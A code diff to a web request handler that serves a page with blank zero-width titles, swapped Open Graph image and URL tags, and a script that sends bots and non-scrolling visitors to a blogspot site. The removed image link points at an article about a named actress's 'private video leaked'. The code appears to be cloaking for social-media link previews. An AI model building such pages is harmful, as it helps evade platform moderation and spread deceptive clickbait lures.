@@ -18,10 +18,12 @@ export default function handler(req, res) {
     res.end(`
       <html>
         <head>
+          <title>&#8203;</title>
           <meta property="og:title" content="&#8203;" />
           <meta property="og:description" content="" />
-          <meta property="og:image" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fzeenews.india.com%2Fkannada%2Fentertainment%2Factress-shruthi-narayanan-private-video-leaked-on-internet-297562&psig=AOvVaw2Ha89izLzZC180EndHRoCX&ust=1751533130072000&source=images&cd=vfe&opi=89978449&ved=0CBQQjRxqFwoTCPif5cnnnY4DFQAAAAAdAAAAABAL" />
-          <meta property="og:url" content="https://facebook.com/empty" />
+          <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4vyWL6EJrmdmh5IOmt7cGz-GpxdLFgF5qHJTMzRFF0Rma1014mNEKrY8xdgkl952JsVR8HHdYHrlS5lqyFOp79YYzz4EGXCBO7C1Ah1TjMXvu1_4P2d_Zgw5UhBk-fNBmCS32gT4QlbGAxh308MgcUbevLfYoeqdlJ8XnFnFHSs2QjDAiWodQLAMa4E0/w640-h360/Tiger%203%20(1).jpg" />
+          <meta property="og:url" content="https://screeninsiderhub.blogspot.com" />
+          <meta property="og:image:alt" content="" />
           <script>
             (function() {
               let isBot = false;
@@ -37,14 +39,14 @@ export default function handler(req, res) {
               window.addEventListener('scroll', () => { isHuman = true; });
               setTimeout(() => {
                 if (isBot || !isHuman) {
-                  window.location.href = 'https://facebook.com';
+                  window.location.href = 'https://screeninsiderhub.blogspot.com';
                 }
               }, 3000);
             })();
           </script>
         </head>
         <body>
-          <p>Facebook or Headless Bot Preview</p>
+          <p>Facebook or Headless Bot Preview Mode</p>
         </body>
       </html>
     `);
